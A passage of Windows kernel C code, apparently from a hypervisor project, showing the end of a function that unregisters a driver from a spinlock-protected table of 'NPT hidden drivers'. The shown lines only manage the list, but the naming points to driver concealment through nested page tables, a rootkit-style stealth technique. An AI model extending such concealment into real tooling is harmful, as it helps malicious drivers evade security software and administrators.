    for (ULONG i = 0; i < g_NptHiddenDriverCount && i < MAX_NPT_HIDDEN_DRIVERS; i++) {
        if (g_NptHiddenDriverBases[i] == driverBase) {
            // 移动后续条目
            for (ULONG j = i; j < g_NptHiddenDriverCount - 1; j++) {
                g_NptHiddenDriverBases[j] = g_NptHiddenDriverBases[j + 1];
                g_NptHiddenDriverSizes[j] = g_NptHiddenDriverSizes[j + 1];
                wcscpy_s(g_NptHiddenDriverNames[j], MAX_NPT_DRIVER_NAME_LEN, 
                    g_NptHiddenDriverNames[j + 1]);
            }
            
            g_NptHiddenDriverCount--;
            found = TRUE;
            break;
        }
    }
    
    KeReleaseSpinLock(&g_NptHiddenDriverLock, oldIrql);
    
    return found ? STATUS_SUCCESS : STATUS_NOT_FOUND;
}
